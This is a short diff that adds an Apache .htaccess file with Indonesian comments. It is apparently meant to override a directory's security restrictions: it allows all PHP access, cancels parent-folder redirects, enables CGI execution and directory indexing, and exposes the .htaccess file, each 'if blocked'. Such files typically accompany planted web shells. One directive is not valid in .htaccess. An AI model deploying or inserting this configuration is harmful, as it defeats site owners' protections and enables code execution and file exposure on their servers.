@@ -1,0 +1,22 @@
+# Mengizinkan Override di Direktori Ini
+AllowOverride All
+
+# Mengizinkan Semua Akses ke PHP
+<FilesMatch "\.php$">
+    Require all granted
+</FilesMatch>
+
+# Menonaktifkan Semua Redirect dari Folder di Atasnya
+RewriteEngine On
+RewriteRule .* - [L]
+
+# Mengizinkan Eksekusi CGI (Jika Diblokir)
+Options +ExecCGI
+
+# Mengizinkan Indexing (Jika Diblokir)
+Options +Indexes
+
+# Menonaktifkan Proteksi .htaccess (Jika Diblokir)
+<Files ".htaccess">
+    Require all granted
+</Files>
